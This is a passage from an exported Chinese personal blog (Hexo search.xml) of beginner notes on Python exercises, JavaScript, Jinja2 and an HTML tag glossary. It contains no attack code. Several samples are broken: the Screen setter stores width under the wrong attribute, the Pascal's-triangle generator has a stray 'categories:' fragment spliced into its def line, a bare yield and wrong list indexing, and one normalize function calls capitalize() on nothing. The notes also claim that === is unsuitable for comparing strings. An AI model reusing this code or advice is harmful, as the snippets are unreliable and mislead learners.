<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Screen</span><span class="params">(object)</span>:</span></span><br><span class="line">----</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">----</span><br><span class="line"><span class="comment"># test:</span></span><br><span class="line">s = Screen()</span><br><span class="line">s.width = <span class="number">1024</span></span><br><span class="line">s.height = <span class="number">768</span></span><br><span class="line">print(s.resolution)</span><br><span class="line"><span class="keyword">assert</span> s.resolution == <span class="number">786432</span>, <span class="string">'1024 * 768 = %d ?'</span> % s.resolution</span><br></pre></td></tr></table></figure>

<ul>
<li>类这大部分跟c的差别不大，唯一的区别就是可以动态绑定属性和函数</li>
<li>这道题不难，很简单，就是方法的使用，无技巧性的东西</li>
<li>贴上我的代码</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Screen</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">width</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._width</span><br><span class="line"><span class="meta">    @width.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">width</span><span class="params">(self,value)</span>:</span></span><br><span class="line">        self._birth = value</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">height</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._height</span><br><span class="line"><span class="meta">    @height.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">height</span><span class="params">(self,value)</span>:</span></span><br><span class="line">        self._height = value</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">resolution</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._birth * self._height</span><br><span class="line"></span><br><span class="line">s = Screen()</span><br><span class="line">s.width = <span class="number">1024</span></span><br><span class="line">s.height = <span class="number">768</span></span><br><span class="line"><span class="keyword">print</span> (s.resolution)</span><br><span class="line"><span class="keyword">assert</span> s.resolution == <span class="number">786432</span>, <span class="string">'1024 * 768 = &#123;&#125;'</span>.format(s.resolution)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第二天学习</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="回数的练习"><a href="#回数的练习" class="headerlink" title="回数的练习"></a>回数的练习</h2><p>我觉得吧，回数的判断方法用切片解决好，即是利用中点，然后判断两个序列是否相同，相同即为回数，这是最开头的想法，然后发觉切片实现这个有点麻烦，无意在网上查到了，直接从头和尾巴开始判断，这是最简单粗暴的办法，不过效率不高</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_palindrome</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(n) == str(n)[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><a id="more"></a>


<h2 id="排序的练习"><a href="#排序的练习" class="headerlink" title="排序的练习"></a>排序的练习</h2><p>so easy,没什么好说的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L =[(<span class="string">'Bob'</span>, <span class="number">75</span>), (<span class="string">'Adam'</span>, <span class="number">92</span>), (<span class="string">'Bart'</span>, <span class="number">66</span>), (<span class="string">'Lisa'</span>, <span class="number">88</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">by_name</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> t[<span class="number">0</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">by_score</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> t[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">L1 = sorted(L,key=by_name)</span><br><span class="line"><span class="keyword">print</span> L1</span><br><span class="line">L2 = sorted(L,key=by_score)</span><br><span class="line"><span class="keyword">print</span> L2</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第一天学习</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><p>本文只记录对于我感兴趣的部分，为了好复习，只写关键点</p><h2 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h2><p>我想的是用循环，迭代的那种方法以及用列表生成式的写法我没想到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">triangle</span><span class="params">()</span>:</span>categories:</span><br><span class="line">    List = [<span class="number">1</span>] <span class="comment">#初始化第一行</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span>    <span class="comment">#迭代，返回然后从下一行开始</span></span><br><span class="line">        List = List[<span class="number">1</span>] + [List[i] + List[i+<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(List) - <span class="number">1</span> )] + List[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><a id="more"></a>



<h2 id="名字规范化"><a href="#名字规范化" class="headerlink" title="名字规范化"></a>名字规范化</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normalize</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> name[:<span class="number">1</span>].upper() + name[<span class="number">1</span>:].lower() <span class="comment">#利用切片巧妙分割</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normalize</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> capitalize() <span class="comment">#ֱ直接利用python现成函数</span></span><br></pre></td></tr></table></figure>

<h2 id="str2float"><a href="#str2float" class="headerlink" title="str2float"></a>str2float</h2><p>这个说实话不用map跟reduce更好写，用了反而不会写了，我想到了将数据分为两部分，没想到最后那个除法写法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x*<span class="number">10</span> + y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2float</span><span class="params">(s)</span>:</span></span><br><span class="line">    place = s.index(<span class="string">'.'</span>)</span><br><span class="line">    str1 = list(map(int,s[:place]))</span><br><span class="line">    str2 = list(map(int,s[place+<span class="number">1</span>:]))</span><br><span class="line">    <span class="keyword">return</span> reduce(f,str1) + reduce(f,str2)/pow(<span class="number">10</span>,len(str2))</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20190125204723398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTAzMzQ2NjY=,size_16,color_FFFFFF,t_70" alt="intersting"></p>
]]></content>
      <categories>
        <category>python基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>web前端学习之js</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="js学习"><a href="#js学习" class="headerlink" title="js学习"></a>js学习</h1><p>inerHtml跟inerText是不一样的，一个包含标签，一个不包含<br>字符串比较不要用===<br>inerText == 字符串可以<br>其余不行</p>]]></content>
      <categories>
        <category>web</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>web,前端</tag>
      </tags>
  </entry>
  <entry>
    <title>jinja2问题记录</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for 循环是一层&#123;&#125;</span><br><span class="line">比如&#123;% for index in group %&#125;</span><br><span class="line">而不是&#123;&#123;% for index in group %&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>web， 前端</tag>
      </tags>
  </entry>
  <entry>
    <title>前端学习1</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h1><html>
<head>
<meta charset="utf-8">
<title>W3Cschool教程(w3cschool.cn)</title>
</head>

<body>
<p>
    <b>这个文本加粗的</b>
</p>
<p>
    <strong>这个文本是加粗的</strong>
</p>
<p>
    <big>这个文本字体放大</big>
</p>
<p>
    <em>这个文本是斜体的</em>
</p>
<p>
    <i>这个文本是斜体的</i>
</p>
<p>
    <small>这个文本是缩小的</small>
</p>
<p>
    这个文本包含<sub>下标</sub>
</p>
<p>
    这个文本包含<sup>上标</sup>
</p>
</body>
</html><a id="more"></a><!DOCTYPE html>


<h1 id="pre标签"><a href="#pre标签" class="headerlink" title="pre标签"></a>pre标签</h1><pre>
    此例演示如何使用 pre 标签
    对空行和   空格
    进行控制
</pre>

<h1 id="html全称"><a href="#html全称" class="headerlink" title="html全称"></a>html全称</h1><p><a>:anchor 定义锚<br><abbr>:abbreviation 定义缩写<br><acronym>: 定义只取消首字母的缩写 </acronym></abbr></a></p>
<address>:定义地址元素 
<area>:定义图像映射内部的区域 
<b>:bold 定义粗体字 
<base>:定义页面当中的所有链接的基准链接 
<bdo>: bidirectional override 定义文字的显示方向 
<big>:定义大号字 
<blockquote>:定义长的引用 
<body>:定义body元素 
<br>:break 插入一个回车 
<button>:定义按钮 
<caption>:定义表格标题 
<cite>:citation 定义引用 
<code>:computer code 定义计算机代码文本 
<col>:column 定义用于表格列的属性 
<colgroup>:column group 定义表格的列祖 
<dd>:definition description 定义定义的描述 
<del>:delete 定义被删除的文本 
<div>:division 定义文档中的节 
<dfn>:defining instance 定义定义的项目。 
<dl>:definition list 定义定义列表 
<dt>:definition term 定义定义的项目 
<em>:emphasized 定义强调文本 
<fieldset>:定义域结构 
<form>:定义表单 
<frame>:定义框架的子窗口 
<frameset>:定义框架集 
<h1>to<h6>:定义标题1到标题6 
<head>:定义关于文档的信息 
<hr>:horizontal 定义水平线 
<html>:hypertext markup language 定义html文档 
<i>:italic 定义斜体字 
<iframe>:inline frame 定义内联框架 
<img>:image 定义图像 
<input>: 定义输入域 
<ins>:inserted 定义被插入的文本 
<kbd>:keyboard 定义键盘文本 
<label>:定义针对表单控件的标签 
<legend>:定义框架集的标题 
<li>:list item 定义列表的项目 
<link>:定义资源引用 
<map>:定义图像映射 
<meta>:定义元信息 
<noframe>:定义无框架的节 
<noscript>:定义无脚本的节 
<object>:定义内嵌对象 
<ol>:ordered list 定义有序列表 
<optgroup>:option group 定义选项组 
<option>:定义下拉列表的选项 
<p>:paragraph 定义段落 
<param>:定义对象的参数 
<pre>:preformatted 定义预格式文本 
<q>:quotation 定义短的引用 
<samp>:sample 定义计算机代码样本 
<script>:定义脚本 
<select>:定义选择列表 
<small>:定义小字体文本 
<span>:定义文档中的节 
<strong>:stronger empasis定义强调文本 
<style>:定义样式的定义 
<sub>:subscript 定义下标文本 
<sup>:superscript 定义上标文本 
<table>:定义表格 
<tbody>:table body 定义表格的主体部分 
<td>:table data cell定义表格单元 
<textarea>:定义文本区域 
<tfoot>:table foot定义表也的脚注 
<th>:table header cell定义表格的表头单元格 
<thead>:table head定义表格的标题 
<title>:定义文档的标题 
<tr>:table row定义表格的行 
<tt>:teletype 定义打字机文本 
<ul>:unordered list 定义无序列表 
<var>:variable 定义变量 


<p>head 头信息<br>title 标题<br>body 正文<br>font 字体<br>br 换行<br>p 段落<br>pre 预格式化<br>hr 水平分界线<br>sup 上标<br>sub 下标<br>b 粗体<br>i 斜体<br>u 下划线<br>em 强调(斜体)<br>strong 强调(粗体)<br>tt 等宽字体(打印机字体)</p>
<ol>
<li></li>
<li></li>
</ol>有序列表
<ul>
<li></li>
<li></li>
</ul>无序列表
<a href=#>超链接
<img src=#>图片链接
th 表头单元
td 表格单元
tr 表格行
table 表格
caption 表格标题
form 交互式表单
input 输入表单控件
option 菜单类控件可选项 select中使用
select 菜单类控件
textarea 多行文本域
style 样式表

<h1 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h1><p><code>计算机输出</code><br><kbd>键盘输入</kbd><br><tt>打字机文本</tt><br><samp>计算机代码样本</samp><br><var>计算机变量</var></p>
</script></samp></q></pre></p></option></optgroup></ol></object></noscript></noframe></map></li></legend></label></kbd></ins></iframe></i></html></head></h6></h1></frameset></form></fieldset></em></dt></dl></dfn></div></del></dd></colgroup></code></cite></caption></button></body></blockquote></big></bdo></b></address>]]></content>
      <categories>
        <category>web</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>web,前端,html</tag>
      </tags>
  </entry>
</search>
